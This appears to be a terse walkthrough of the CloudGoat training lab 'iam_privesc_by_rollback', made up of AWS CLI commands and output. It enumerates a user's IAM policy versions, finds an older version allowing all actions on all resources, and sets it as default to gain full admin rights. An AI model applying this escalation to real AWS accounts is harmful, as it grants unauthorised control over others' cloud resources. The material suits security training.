`./cloudgoat.py create iam_privesc_by_rollback --profile default`

```
aws iam get-user

{
    "User": {
        "Path": "/",
        "UserName": "raynor",
        "UserId": "",
        "Arn": "arn:aws:iam::0:user/raynor",
        "CreateDate": "2019-07-28T20:07:33Z",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-raynor-cgidtezil68pox"
            }
        ]
    }
}
```

```
aws iam list-attached-user-policies --user-name raynor

{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy",
            "PolicyArn": "arn:aws:iam::0:policy/cg-raynor-policy"
        }
    ]
}
```

```
aws iam get-policy --policy-arn arn:aws:iam::0:policy/cg-raynor-policy

{
    "Policy": {
        "PolicyName": "cg-raynor-policy",
        "PolicyId": "",
        "Arn": "arn:aws:iam::0:policy/cg-raynor-policy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-raynor-policy",
        "CreateDate": "2019-07-28T20:07:33Z",
        "UpdateDate": "2019-07-28T20:07:35Z"
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::0:policy/cg-raynor-policy --version-id v1

{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "IAMPrivilegeEscalationByRollback",
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2019-07-28T20:07:33Z"
    }
}
```

```
aws iam list-policy-versions --policy-arn arn:aws:iam::0:policy/cg-raynor-policy

{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": false,
            "CreateDate": "2019-07-28T20:07:35Z"
        },
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2019-07-28T20:07:35Z"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2019-07-28T20:07:35Z"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2019-07-28T20:07:35Z"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2019-07-28T20:07:33Z"
        }
    ]
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::0:policy/cg-raynor-policy --version-id v2

{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2019-07-28T20:07:35Z"
    }
}
```

```
aws iam set-default-policy-version --policy-arn arn:aws:iam::0:policy/cg-raynor-policy --version-id v2
```

`./cloudgoat.py destroy iam_privesc_by_rollback --profile default`
